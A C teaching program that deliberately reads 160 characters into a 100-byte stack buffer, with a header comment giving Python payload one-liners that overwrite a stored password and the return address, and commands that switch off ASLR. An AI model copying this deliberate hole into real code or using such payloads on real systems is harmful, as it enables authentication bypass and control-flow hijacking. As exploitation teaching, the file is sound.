/**
  *   
  *  This program highlights a simple stack based overflow. We have password
  *  placed on the stack against which we check in order to validate a user's
  *  credentials. In a normal scenario this program should return 
  *  "Login Successful!" only when the user types in "XYZT" (then press enter).
  *  The buffer in which we want to store user input is 100 bytes long however
  *  when we read from stdin we allow a read of maximum 160 characters. If we 
  *  feed in more than 100 characters we will overwrite past the limits of 
  *  @input, which is placed 107 bytes apart from password. In this case, 
  *  the 108th byte and the following bytes of input will overflow into password.
  *  We can use this to "trick" the strcmp check on line 45.
  *
  *
  *  1.Running the program and triggering the overflow:
  *  -> python -c "print 'RAND'+'\x00'+102*'A'+'RAND'+'\x00'" | ./simple_overflow
  *
  *  Hints: 'RAND'+'\0x00'(null byte) + 102*A -> we have 107 bytes here.
  *  No guarantee these buffers are 107 bytes appart on your computer so check
  *  the output of "Offset between...", it will print the offset. Modify
  *  
  * 
  *  2.More fancy overflow that also prints the private_function a few times 
  *  before segfaulting:
  *  Disable ASLR:
  *  echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
  *  Run program once and check the "Offset between..." message (it prints the
  *  address of private_function.
  *  
  *  IF for example the program prints the following:
  *  Offset between fields 107 x5555555549da type in the following command.
  *  python -c "print 'RAND'+'\x00'+102*'A'+'RAND'+'\x00' + 'RRRRRRRR' + '\xda\x49\x55\x55\x55\x55\x00\x00'" | ./simple_overflow
  *  
  *  Explanation: 'RAND'+'\x00'+102*'A'+'RAND'+'\x00' + 'RRRRRRRR' this writes 
  *  up until the end of password, 'RRRRRRRR' we overwrite the EBP saved on the
  *  stack, '\xda\x49\x55\x55\x55\x55\x00\x00' we overwrite the return address
  *  and make our program jump to private_function.
  *  
  *  ENABLE ASLR after: echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
  *
  *
  *
  *
***/
#include <assert.h>
#include <ctype.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "util.h"

#define MAX_LEN_STR 160

void private_function(void){
  printf("We are executing a private function\n");
}
int main(){
   /* Normally you wouldn't put a password in plain n'or in a writable section */
   char password[5] = {'X', 'Y', 'Z', 'T', '\0'};
   char input[100];

   memset(input, 0, 100);
   printf("Offset between fields %ld x%llx\n", password-input, (unsigned long long)&private_function);

   read_line_nonewline(stdin, input, MAX_LEN_STR);

   /* No sanity check to see if what we read actually fits in the buffer */
   
   if (strcmp(password,input) == 0 ){
       printf("Login successful!\n");
   } else {
     printf("Login failed!\n");
   }
}
